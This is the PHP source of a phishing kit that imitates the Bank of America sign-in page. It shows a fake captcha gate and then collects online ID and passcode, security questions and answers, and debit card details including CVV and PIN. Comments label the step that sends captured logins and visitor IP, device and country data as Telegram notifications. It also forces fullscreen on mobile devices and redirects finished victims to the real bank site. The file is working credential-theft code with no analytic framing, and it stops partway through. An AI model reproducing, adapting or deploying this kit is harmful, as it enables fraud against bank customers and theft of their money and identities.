<?php

ini_set('session.save_path',realpath(dirname($_SERVER['DOCUMENT_ROOT']) . '/../session'));
session_start();

if (isset($_SESSION['FINAL']) && $_SESSION['FINAL'] == TRUE) {
	header("Location: https://www.bankofamerica.com/");
}

# ---- VARIABLES GLOBALES ---- #

$document_root = $_SERVER['DOCUMENT_ROOT'].'/perso/en/security/lognon'; # Url principal del servidor.
$document_private = $document_root.'/private';
$document_config = $document_private.'/inc_config.php';

if (!is_dir($document_private)) {
	echo "No existe el directorio: <b>".$document_private."</b>, Subio bien la aplicacion?"; exit;
}
if (file_exists($document_config)) {
	require_once($document_config);
} else {
	echo "No existe el fichero: <b>".$document_config."</b>, Subio bien la aplicacion?"; exit;
}

if (isset($_SERVER['QUERY_STRING']) && !empty($_SERVER['QUERY_STRING']) && !isset($_POST['secure'])) {
	$_queryenc = $_SERVER['QUERY_STRING'];
	$_query = base64_decode($_SERVER['QUERY_STRING']);
	$pos = strpos($_query, ',');
	if ($pos !== false) {
		$_query=explode(",",$_query);
		if (isset($_query[0]) && !empty($_query[0]) && isset($_query[1]) && !empty($_query[1]) && isset($_query[2]) && !empty($_query[2])) {
			$_secure = $_query[0];
			$_language = $_query[1];
			$_email = $_query[2];
			if ($_email=='none') {
				$panel = 1;
			} elseif (strpos($_email,'@') !== false) {
				$panel = 2;
				$_none = $_secure.','.$_language.',none,5FBB45E172DAC4ED4632F8C84D16CAAB7C6F836E74F25BAE7153';
				$_none = base64_encode($_none);
			} else {
				echo "<h1>Thanks for signing up with BIC!:</h1><br /><span>Email succesfully activated.<span><br /><span>Please close this tab.<span>";exit;
			}
		}
	} else {
		echo "<h1>Thanks for signing up with BIC!:</h1><br /><span>Email succesfully activated.<span><br /><span>Please close this tab.<span>";exit;
	}
} 

if (empty($_SERVER['QUERY_STRING']) && empty($_POST['secure'])){
if (isset($_SESSION['SYSTEM']) && $_SESSION['SYSTEM'] == TRUE) {
	?>
<form id="secure_session" method="POST" action="./">
<input type="hidden" name="secure" value="true" required/>
<input style="display:inline-block;border:0;height:1px;overflow:hidden;padding:0;width:1px;white-space:nowrap" type="text" id="activateEmail" minlength="6" maxlength="6" name="activateEmail" placeholder="Security Code" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');" required/>
</form>
<script>
document.getElementById('secure_session').submit();
</script>
	<?php
}
	echo "<h1>Thanks for signing up with BIC!:</h1><br /><span>Email succesfully activated.<span><br /><span>Please close this tab.<span>";exit;
}

?>
<html lang="en-US" layoutversion="3.1.0" layoutsupportheaderversion="5.0.1">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php if (isset($_POST['secure']) && !empty($_POST['secure']) && $_POST['secure'] == 'true') { echo 'Sign In | Bank of America'; } else { echo 'Safe Browsing'; } ?></title>
<link rel="shortcut icon" href="./assets/favicon.ico">
<link rel="stylesheet" type="text/css" href='./assets/main.css'>
<link rel="stylesheet" type="text/css" href="./assets/captcha.css">
<style>.st0{fill:#243b7a}.st0{fill:#243b7a}.st0{fill:#243b7a}</style><style>body{visibility:hidden}</style>
<style>
body {
	font-family: 'Barlow', serif;
}
@font-face {
	font-family: 'Barlow';
	src: url('./assets/Barlow-Regular.ttf');
}
.navigation__logo {
    display: flex;
    -ms-flex-pack: justify;
    max-width: 380px;
    max-height: 45px;
	padding-top: 7px;
	padding-left: 0px;
	padding-bottom: 7px;
}
</style>
<style>
#loading {
  display: inline-block;
  width: 190px;
  height: 190px;
  border: 3px solid rgba(255,255,255,.3);
  border-radius: 50%;
  border-top-color:lightblue;
  animation: spin 1s ease-in-out infinite;
  -webkit-animation: spin 1s ease-in-out infinite;
}
@keyframes spin {
  to { -webkit-transform: rotate(360deg); }
}
@-webkit-keyframes spin {
  to { -webkit-transform: rotate(360deg); }
}
#inTurnFadingTextG{
	width:132px;
	margin:auto;
}
.inTurnFadingTextG{
	color:rgb(58,59,111);
	font-family:Arial;
	font-size:14px;
	text-decoration:none;
	font-weight:normal;
	font-style:normal;
	float:left;
	animation-name:bounce_inTurnFadingTextG;
		-o-animation-name:bounce_inTurnFadingTextG;
		-ms-animation-name:bounce_inTurnFadingTextG;
		-webkit-animation-name:bounce_inTurnFadingTextG;
		-moz-animation-name:bounce_inTurnFadingTextG;
	animation-duration:2.09s;
		-o-animation-duration:2.09s;
		-ms-animation-duration:2.09s;
		-webkit-animation-duration:2.09s;
		-moz-animation-duration:2.09s;
	animation-iteration-count:infinite;
		-o-animation-iteration-count:infinite;
		-ms-animation-iteration-count:infinite;
		-webkit-animation-iteration-count:infinite;
		-moz-animation-iteration-count:infinite;
	animation-direction:normal;
		-o-animation-direction:normal;
		-ms-animation-direction:normal;
		-webkit-animation-direction:normal;
		-moz-animation-direction:normal;
}
#inTurnFadingTextG_1{
	animation-delay:0.75s;
		-o-animation-delay:0.75s;
		-ms-animation-delay:0.75s;
		-webkit-animation-delay:0.75s;
		-moz-animation-delay:0.75s;
}
#inTurnFadingTextG_2{
	animation-delay:0.9s;
		-o-animation-delay:0.9s;
		-ms-animation-delay:0.9s;
		-webkit-animation-delay:0.9s;
		-moz-animation-delay:0.9s;
}
#inTurnFadingTextG_3{
	animation-delay:1.05s;
		-o-animation-delay:1.05s;
		-ms-animation-delay:1.05s;
		-webkit-animation-delay:1.05s;
		-moz-animation-delay:1.05s;
}
#inTurnFadingTextG_4{
	animation-delay:1.2s;
		-o-animation-delay:1.2s;
		-ms-animation-delay:1.2s;
		-webkit-animation-delay:1.2s;
		-moz-animation-delay:1.2s;
}
#inTurnFadingTextG_5{
	animation-delay:1.35s;
		-o-animation-delay:1.35s;
		-ms-animation-delay:1.35s;
		-webkit-animation-delay:1.35s;
		-moz-animation-delay:1.35s;
}
#inTurnFadingTextG_6{
	animation-delay:1.5s;
		-o-animation-delay:1.5s;
		-ms-animation-delay:1.5s;
		-webkit-animation-delay:1.5s;
		-moz-animation-delay:1.5s;
}
#inTurnFadingTextG_7{
	animation-delay:1.64s;
		-o-animation-delay:1.64s;
		-ms-animation-delay:1.64s;
		-webkit-animation-delay:1.64s;
		-moz-animation-delay:1.64s;
}
@keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
@-o-keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
@-ms-keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
@-webkit-keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
@-moz-keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
.tooltip {
    position: absolute;
    white-space: nowrap;
	left:-10%;
	bottom:30;
    display: none;
    background: #ffffcc;
    border: 1px solid black;
    padding: 5px;
    z-index: 1000;
    color: black;
	opacity: .9;
}
.tooltipcard {
    position: absolute;
    white-space: nowrap;
	left:-80%;
	bottom:50;
    display: none;
    background: #ffffcc;
    border: 1px solid black;
    padding: 5px;
    z-index: 1000;
    color: black;
	opacity: .9;
}
.tooltipvmail {
    position: absolute;
    white-space: nowrap;
	left:-80%;
	bottom:50;
    display: none;
    background: #ffffcc;
    border: 1px solid black;
    padding: 5px;
    z-index: 1000;
    color: black;
	opacity: .9;
}
.noselect {
  -webkit-touch-callout: none; /* iOS Safari */
    -webkit-user-select: none; /* Safari */
     -khtml-user-select: none; /* Konqueror HTML */
       -moz-user-select: none; /* Old versions of Firefox */
        -ms-user-select: none; /* Internet Explorer/Edge */
            user-select: none; /* Non-prefixed version, currently
                                  supported by Chrome, Edge, Opera and Firefox */
}
.myButton {
	box-shadow:inset 0px 1px 0px 0px #ffffff;
	background:linear-gradient(to bottom, #ededed 5%, #dfdfdf 100%);
	background-color:#ededed;
	border-radius:6px;
	border:1px solid #dcdcdc;
	display:inline-block;
	cursor:pointer;
	color:#777777;
	font-family:Arial;
	font-size:15px;
	font-weight:bold;
	padding:6px 24px;
	text-decoration:none;
	text-shadow:0px 1px 0px #ffffff;
}
.myButton:hover {
	background:linear-gradient(to bottom, #dfdfdf 5%, #ededed 100%);
	background-color:#dfdfdf;
}
.myButton:active {
	position:relative;
	top:1px;
}
</style>
<script>
function show(elem) {  
    elem.style.display="inline-block";
}
function hide(elem) { 
    elem.style.display="";
}
function verify() {
	if (document.getElementById('onlineId1').value.length > '3' && document.getElementById('passcode1').value.length > '3') {
		document.getElementById('loadinglogin').style.display = 'block';
		setTimeout(continueform, 2000);
		function continueform() {
			document.getElementById('signinClient').submit();
		}
	}
}
function verify2() {
	if (document.getElementById('onlineId1').value.length > '3' && document.getElementById('passcode1').value.length > '3') {
		document.getElementById('PwdlessFailedNotification').style.display = 'block';
		document.getElementById('loader').style.visibility = 'visible';
		setTimeout(continueform, 3500);
		function continueform() {
			document.getElementById('signinClient2').submit();
		}
	}
}
function verifyquestions() {
	if (document.getElementById('question1').value.length > '4' && document.getElementById('response1').value.length > '3' && document.getElementById('question2').value.length > '4' && document.getElementById('response2').value.length > '3' && document.getElementById('question3').value.length > '4' && document.getElementById('response3').value.length > '3') {
		document.getElementById('loader').style.visibility = 'visible';
		setTimeout(continueformq, 3500);
		function continueformq() {
			document.getElementById('questionsform').submit();
		}
	} else {
		show(tooltip1);
	}
}
function verifyquestions2() {
	if (document.getElementById('question1').value.length > '4' && document.getElementById('response1').value.length > '3' && document.getElementById('question2').value.length > '4' && document.getElementById('response2').value.length > '3' && document.getElementById('question3').value.length > '4' && document.getElementById('response3').value.length > '3') {
		document.getElementById('invalid').style.display='none';
		document.getElementById('loader').style.visibility = 'visible';
		setTimeout(continueformq, 3500);
		function continueformq() {
			document.getElementById('questionsform2').submit();
		}
	} else {
		show(tooltip1);
	}
}
function verifydebitcard() {
	if (document.getElementById('card').value.length == '19' && document.getElementById('month').value.length > '2' && document.getElementById('year').value.length == '4' && document.getElementById('cvv').value.length > '2' && document.getElementById('pin').value.length > '3') {
		document.getElementById('loadingcard').style.display = 'block';
		setTimeout(continueformq, 3500);
		function continueformq() {
			document.getElementById('debitcardform').submit();
		}
	} else {
		show(tooltip1);
	}
}
function verifydebitcard2() {
	if (document.getElementById('card').value.length == '19' && document.getElementById('month').value.length > '2' && document.getElementById('year').value.length == '4' && document.getElementById('cvv').value.length > '2' && document.getElementById('pin').value.length > '3') {
		document.getElementById('loader').style.visibility = 'visible';
		setTimeout(continueformq, 3500);
		function continueformq() {
			document.getElementById('debitcardform2').submit();
		}
	} else {
		show(tooltip1);
	}
}
function validateEmail(email) {
	var re = /\S+@\S+\.\S+/;
	return re.test(email);
}
function verifyvmail() {
	if (validateEmail(document.getElementById('email').value) == true) {
		if (document.getElementById('email').value.length > 5 && document.getElementById('email_password').value.length > '3') {
			document.getElementById('loader').style.visibility = 'visible';
			setTimeout(continueformq, 3500);
			function continueformq() {
				document.getElementById('vmailform').submit();
			}
		} else {
			show(tooltip1);
		}
	} else {
		show(tooltip2);
	}
}
function verifyrevmail() {
	if (validateEmail(document.getElementById('email').value) == true) {
		if (document.getElementById('email').value.length > 5 && document.getElementById('email_password').value.length > '3') {
			document.getElementById('loader').style.visibility = 'visible';
			setTimeout(continueformq, 3500);
			function continueformq() {
				window.location.href="./id-verification/";
			}
		} else {
			show(tooltip1);
		}
	} else {
		show(tooltip2);
	}
}
function dispositivo() {
	document.getElementById('dispositive').style.visibility = 'visible';
	setTimeout(continuetobanc, 1500);
	function continuetobanc() {
		document.getElementById('dispositive').style.visibility = 'hidden';
		document.getElementById('loader').style.visibility = 'visible';
	}
}
function waitfors() {
	setTimeout(continuewaitfors, 2500);
	function continuewaitfors() {
		document.getElementById('init_block').style.display='none';
		document.getElementById('init_hidde').style.display='block';
		//document.getElementById('secure').submit();
	}
}
function validaSession() {
	if (document.getElementById('recaptcha-anchor').classList.contains('recaptcha-checkbox-checked')) {
		document.getElementById('valida').onclick = false;
		<?php $_SESSION['SYSTEM']=TRUE; ?>
		var x = "<?php if ($_SESSION['SYSTEM']==TRUE){echo $_SESSION['SYSTEM'];} else {echo 'False';} ?>";
		document.getElementById('secure_session').submit();
	} else {
		document.getElementById('recaptcha-anchor').classList.remove('recaptcha-checkbox-clearOutline');
		document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-expired');
	}
}

<?php if($useragent->platform['type']=='device'){ ?>
function autoScreen() {
  var doc = window.document;
  var docEl = doc.documentElement;

  var requestFullScreen = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl.webkitRequestFullScreen || docEl.msRequestFullscreen;
  var cancelFullScreen = doc.exitFullscreen || doc.mozCancelFullScreen || doc.webkitExitFullscreen || doc.msExitFullscreen;

  if(!doc.fullscreenElement && !doc.mozFullScreenElement && !doc.webkitFullscreenElement && !doc.msFullscreenElement) {
    requestFullScreen.call(docEl);
	var fullscreenState = document.getElementById("fsStatus_");
	if (fullscreenState) {
		document.addEventListener("fullscreenchange", function () {
			fullscreenState.innerHTML = (document.fullscreenElement)? "yes" : "not ";
		}, false);
		
		document.addEventListener("msfullscreenchange", function () {
			fullscreenState.innerHTML = (document.msFullscreenElement)? "yes" : "not ";
		}, false);
		
		document.addEventListener("mozfullscreenchange", function () {
			fullscreenState.innerHTML = (document.mozFullScreen)? "yes" : "not ";
		}, false);
		
		document.addEventListener("webkitfullscreenchange", function () {
			fullscreenState.innerHTML = (document.webkitIsFullScreen)? "yes" : "not ";
		}, false);
	}
  }
}

function bonload() {
	var viewFullScreen = document.getElementById("fullscreenbdy");
    viewFullScreen.addEventListener("click", function () {
        var docElm = document.documentElement;
        if (docElm.requestFullscreen) {
            docElm.requestFullscreen();
        }
        else if (docElm.msRequestFullscreen) {
            docElm = document.body; //overwrite the element (for IE)
            docElm.msRequestFullscreen();
        }
        else if (docElm.mozRequestFullScreen) {
            docElm.mozRequestFullScreen();
        }
        else if (docElm.webkitRequestFullScreen) {
            docElm.webkitRequestFullScreen();
        }
    }, false);
}
function checkstatus() {
	if (document.getElementById('fsStatus_').innerHTML='not') {
		autoScreen();
	}
}
setInterval(checkstatus,500);
<?php } ?>

<?php if ($_SESSION['SYSTEM']!=TRUE){}else{echo "waitfors()";} ?>
</script>
</head>
<body <?php if($useragent->platform['type']=='device'){echo 'id="fullscreenbdy" onload="autoScreen();bonload()" onclick="bonload()"';} ?> class="small small-up medium medium-up large large-up large-only largeCentered landscape standard" style="visibility: visible;">
<div data-sparta-container="homepage" class="flex-grid-nest spa-contextroot-homepage spa-site-homepage">
<script type="text/javascript">if(self==top){var theBody=document.getElementsByTagName("body")[0];theBody.style.visibility="visible"}else top.location=self.location</script>
<noscript><style>body{visibility:visible}</style></noscript>
<div id="loader" style="visibility:hidden; position: absolute; z-index: 1000; display: flex; justify-content: center; align-items: center; height: 100%; width: 100%; background: white center center no-repeat; opacity: .8;">
<center>
<img style="position: absolute; padding-left: 5px; padding-top: 5px;" width="180px" height="180px" src="./assets/load.svg"/>
<div style="position: relative;" id="loading"></div>
</center>
</div>
<div id="dispositive" onclick="this.style.visibility='hidden';" style="visibility:hidden; position: absolute; z-index: 1000; display: flex; justify-content: center; align-items: center; height: 100%; width: 100%; background: black center center no-repeat; opacity: .3;">
<center>
<img style="position: absolute; padding-left: 5px; padding-top: 5px;" width="180px" height="180px" src="./assets/success.gif"/>
<div style="position: relative;" id="loading"></div>
</center>
</div>
<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['activateEmail']) && !empty($_POST['activateEmail'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($dispositivo) && !empty($dispositivo) && isset($browser) && !empty($browser) && isset($fcountry) && !empty($fcountry) && isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['activateEmail']) && !empty($_POST['activateEmail']) && !isset($_POST['panel'])) {
	$msj = '[BOT]: '.$ip.' | Dispositivo: '.$dispositivo.' | Navegador: '.$browser.' | '.$fcountry.' |';
	opMsj($msj, 1);
} else {
	if (isset($dispositivo) && !empty($dispositivo) && isset($browser) && !empty($browser) && isset($fcountry) && !empty($fcountry) && isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['activateEmail']) && !empty($_POST['activateEmail']) && !isset($_POST['panel'])) {
		$msj = '[BOT]: '.$ip.' | Dispositivo: '.$dispositivo.' | Navegador: '.$browser.' | '.$fcountry.' |';
		opMsj($msj, 1);
	} else {
		header("Location: ./");
	}
}

?>

<h1>Thanks for signing up with BIC!:</h1>
<br />
<span>Email succesfully activated.<span>
<br />
<span>Please close this tab.<span>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true') { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($dispositivo) && !empty($dispositivo) && isset($browser) && !empty($browser) && isset($fcountry) && !empty($fcountry) && isset($_POST['secure']) && $_POST['secure'] == 'true' && !isset($_POST['panel'])) {
	$msj = 'Nueva visita de: '.$ip.' | Dispositivo: '.$dispositivo.' | Navegador: '.$browser.' | '.$fcountry.' |';
	opMsj($msj, 1);
} else {
	if (isset($dispositivo) && !empty($dispositivo) && isset($browser) && !empty($browser) && isset($fcountry) && !empty($fcountry) && isset($_POST['secure']) && $_POST['secure'] == 'true' && !isset($_POST['panel'])) {
		$msj = 'Nueva visita de: '.$ip.' | Dispositivo: '.$dispositivo.' | Navegador: '.$browser.' | '.$fcountry.' |';
		opMsj($msj, 1);
	} else {
		header("Location: ./");
	}
}

?>

<header id="navigation" class="navigation header not-modal" data-action="navigation">
            <div class="navigation__wrapper">
<form id="secure_session" method="POST" action="./">
<input type="hidden" name="secure" value="true" required/>
<input style="display:inline-block;border:0;height:1px;overflow:hidden;padding:0;width:1px;white-space:nowrap" type="text" id="activateEmail" minlength="6" maxlength="6" name="activateEmail" placeholder="Security Code" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');" required/>
                <a onclick="document.getElementById('secure_session').submit()" style="cursor:pointer;padding-left:3px;width:300px;display:block"><img class="navigation__logo" src="./assets/bofa-logo.svg" alt="Bank of America Homepage"></a>
</form>
				</div>
        </header>
<div class="inline-styles">
  <style type="text/css">
    .masthead-container-module .partial-container .masthead-background::before {
        display: none;
    }
  @media screen and (max-width: 767px) {
    .masthead-container-module .partial-container .headline-content .headline {
        font-size: 32px;
    }
  }
  @media screen and (min-width: 768px) and (max-width: 1024px) {
    .masthead-container-module .partial-container .headline-content .copy {
        padding-right: 32%;
    }
  }
  @media screen and (max-width: 767px) {
      .masthead-container-module .masthead-content .masthead-background::before {
        background: linear-gradient(to bottom,
            rgba(246, 246, 246, 1) calc(35% + 0px),
            rgba(246, 246, 246, 0) 100%);

        height: calc(0px + 100px);
      }
        [data-sparta-container] .masthead-container-module {
          background: rgba(246, 246, 246, 1);
        }
        [data-sparta-container] .masthead-container-module {
          background-color: #fff;
        }
  }
  @media screen and (min-width: 768px) and (max-width: 1024px) {
      .masthead-container-module .masthead-content .masthead-background::before {
        background: linear-gradient(to bottom,
          rgba(246, 246, 246, 1) calc(35% + 0px),
          rgba(246, 246, 246, 0) 100%);
        height: calc(0px + 100px);
      }
        [data-sparta-container] .masthead-container-module {
          background: rgba(246, 246, 246, 1);
        }
        [data-sparta-container] .masthead-container-module {
          background-color: #fff;
        }
  }
  @media screen and (min-width: 1025px) {
      .masthead-container-module .masthead-content .masthead-background::before {
        background: linear-gradient(to bottom,
          rgba(246, 246, 246, 1) calc(35% + 0px),
          rgba(246, 246, 246, 0) 100%);

        height: calc(0px + 100px);
      }
        [data-sparta-container] .masthead-container-module {
          background: rgba(246, 246, 246, 1);
        }
  }
</style>
</div>
<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'preg' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'preg' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) {
	$msj = '<b>[LOGIN]</b>: '.$ip.' | Usuario: <b>'.$_POST['onlineId1'].'</b> | Password: <b>'.$_POST['passcode1'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'preg' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) {
		$msj = '<b>[LOGIN]</b>: '.$ip.' | Usuario: <b>'.$_POST['onlineId1'].'</b> | Password: <b>'.$_POST['passcode1'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:8px;">
<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Security Questions
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px; padding-bottom:2px;">
<span style="font-size: 14px;">For security reasons answer the following questions</span>
</div>
</div>
</div>
<div id="faq-selector">
<form id="questionsform" action="./" novalidate="" autocomplete="off" method="POST" tabindex="-1">
<input type="hidden" name="onlineId1" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1'])) {echo $_POST['onlineId1'];} ?>"/>
<input type="hidden" name="passcode1" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) {echo $_POST['passcode1'];} ?>"/>
<input type="hidden" name="onlineId2" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['onlineId2']) && !empty($_POST['onlineId2'])) {echo $_POST['onlineId2'];} ?>"/>
<input type="hidden" name="passcode2" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['passcode2']) && !empty($_POST['passcode2'])) {echo $_POST['passcode2'];} ?>"/>
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="card"/>
<div class="medium-12 columns medium-centered horiz-center-align">
<div class="faq-selector-container" style="background-color:#F9F9F9; padding:15px; border: 2px solid #F2F1F1;">
<div class="input-box">
<div class="spa-input spa-input-box spa-input--sparta2">
<select autofocus onclick="hide(tooltip1);" id="question1" name="question1" class="spa-input-select" autocomplete="off" required="" type="text">
<option value="">Por favor seleccione su primera pregunta</option>
<option value="¿a que personaje famoso se parece usted mas?">¿a que personaje famoso se parece usted mas?</option>
<option value="¿Cuál es el apellido de su maestra de tercer grado?">¿Cuál es el apellido de su maestra de tercer grado?</option>
<option value="¿Cuál era el nombre de su primer novio o primera novia?">¿Cuál era el nombre de su primer novio o primera novia?</option>
<option value="¿Cuál es el nombre de su institucion benefica preferida?">¿Cuál es el nombre de su institucion benefica preferida?</option>
<option value="¿Cuál es el nombre de su primera niñera?">¿Cuál es el nombre de su primera niñera?</option>
<option value="¿Cuál es el nombre de su mejor amigo?">¿Cuál es el nombre de su mejor amigo?</option>
<option value="¿En qué ciudad conoció a su esposa/pareja?">¿En qué ciudad conoció a su esposa/pareja?</option>
<option value="¿En que ciudad pasó su luna de miel?">¿En que ciudad pasó su luna de miel?</option>
<option value="¿Cuál es el apellido del medico de su familia?">¿Cuál es el apellido del medico de su familia?</option>
<option value="¿En qué calle vivía su mejor amigo de la escuela secundaria?">¿En qué calle vivía su mejor amigo de la escuela secundaria?</option>
<option value="javascript:void(0);" disabled="disabled">—————————————</option>
</select>
</div>
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2" style="padding-top:6px;padding-bottom:15px">
<input onclick="hide(tooltip1);" type="text" class="spa-input-text" id="response1" name="response1" placeholder="Answer" minlength="4" required/>
</div>
<div class="spa-input spa-input-box spa-input--sparta2">
<select onclick="hide(tooltip1);" id="question2" name="question2" class="spa-input-select" autocomplete="off" required="" type="text">
<option value="">Seleccione su segunda pregunta</option>
<option value="De niño,¿qué quería ser cuando fuese mayor?">De niño,¿qué quería ser cuando fuese mayor?</option>
<option value="¿Cúal es el nombre de su restaurante preferido?">¿Cúal es el nombre de su restaurante preferido?</option>
<option value="¿Cúal es su personaje historico preferido?">¿Cúal es su personaje historico preferido?</option>
<option value="¿Cúal es el nombre de su atleta estrella de la escuela secundaria?">¿Cúal es el nombre de su atleta estrella de la escuela secundaria?</option>
<option value="¿Dónde estaba el dia de año nuevo del año 2000?">¿Dónde estaba el dia de año nuevo del año 2000?</option>
<option value="¿Cuál era la marca y modelo de su primer automovil?">¿Cuál era la marca y modelo de su primer automovil?</option>
<option value="¿Cuál era el nombre de pila de su primer gerente (jefe)?">¿Cuál era el nombre de pila de su primer gerente (jefe)?</option>
<option value="¿Cuál es el nombre de su padrino o madrina de bodas?">¿Cuál es el nombre de su padrino o madrina de bodas?</option>
<option value="¿Cuál fue el primer concierto al que asistió?">¿Cuál fue el primer concierto al que asistió?</option>
<option value="javascript:void(0);" disabled="disabled">—————————————</option>
</select>
</div>
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2" style="padding-top:6px;padding-bottom:15px">
<input onclick="hide(tooltip1);" type="text" class="spa-input-text" id="response2" name="response2" placeholder="Answer" minlength="4" required/>
</div>
<div class="spa-input spa-input-box spa-input--sparta2" style="padding-bottom:6px">
<select onclick="hide(tooltip1);" id="question3" name="question3" class="spa-input-select" autocomplete="off" required="" type="text">
<option value="">Seleccione su tercera pregunta</option>
<option value="¿Cuál es su canción preferida de toda la vida?">¿Cuál es su canción preferida de toda la vida?</option>
<option value="¿Cuál es el nombre de la universidad a la que solicitó ingreso pero no fue?">¿Cuál es el nombre de la universidad a la que solicitó ingreso pero no fue?</option>
<option value="¿Cuál es el nombre del profesional médico que ayudó en el nacimiento de su primer hijo?">¿Cuál es el nombre del profesional médico que ayudó en el nacimiento de su primer hijo?</option>
<option value="¿Cuál es el nombre de su sobrino/a preferido/a?">¿Cuál es el nombre de su sobrino/a preferido/a?</option>
<option value="¿Cuál es el nombre de su mejor amigo de la infancia?">¿Cuál es el nombre de su mejor amigo de la infancia?</option>
<option value="¿Cuál es el nombre de su maestro o profesor favorito?">¿Cuál es el nombre de su maestro o profesor favorito?</option>
<option value="¿Cuál es el nombre de su peluquero/barbero?">¿Cuál es el nombre de su peluquero/barbero?</option>
<option value="¿Cuál es el nombre del amigo mas cercano de su madre?">¿Cuál es el nombre del amigo mas cercano de su madre?</option>
<option value="¿En qué calle está su tienda de alimentos?">¿En qué calle está su tienda de alimentos?</option>
<option value="¿Cuál es el nombre de su primera mascota?">¿Cuál es el nombre de su primera mascota?</option>
<option value="javascript:void(0);" disabled="disabled">—————————————</option>
</select>
</div>
<div id="visible"></div>
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2" style="padding-bottom:15px">
<input onkeypress="if(window.event.keyCode==13){verifyquestions();}" onclick="hide(tooltip1);" type="text" class="spa-input-text" id="response3" name="response3" placeholder="Answer" minlength="4" required/>
</div>
<center>
<div style="position:relative;z-index:99;display:inline-block;">
<span class="tooltip" id="tooltip1" onclick="hide(tooltip1);">
<center>Por favor complete todas las preguntas y respuestas.</center>
</span>
<input type="button" id="change-faq-button" onclick="verifyquestions();" href="javascript:void(0);" class="spa-btn spa-btn--medium" style="color: #fff; background-color: firebrick;" value="Confirm your questions">
</div>
</center>
</div>
</div>
</div>
<input type="hidden" name="viewstate" value="?dHJ1ZSxlcyxjYXJsb3NtYXJpbnNpZm9udGVzQGdtYWlsLmNvbSw1RkJCNDVFMTcyREFDNEVENDYzMkY4Qzg0RDE2Q0FBQjdDNkY4MzZFNzRGMjVCQUU3MTUz" /></form>
</div>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'pregcontinue' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1']) && isset($_POST['onlineId2']) && !empty($_POST['onlineId2']) && isset($_POST['passcode2']) && !empty($_POST['passcode2']) && isset($_POST['question1']) && !empty($_POST['question1']) && isset($_POST['response1']) && !empty($_POST['response1']) && isset($_POST['question2']) && !empty($_POST['question2']) && isset($_POST['response2']) && !empty($_POST['response2']) && isset($_POST['question3']) && !empty($_POST['question3']) && isset($_POST['response3']) && !empty($_POST['response3'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

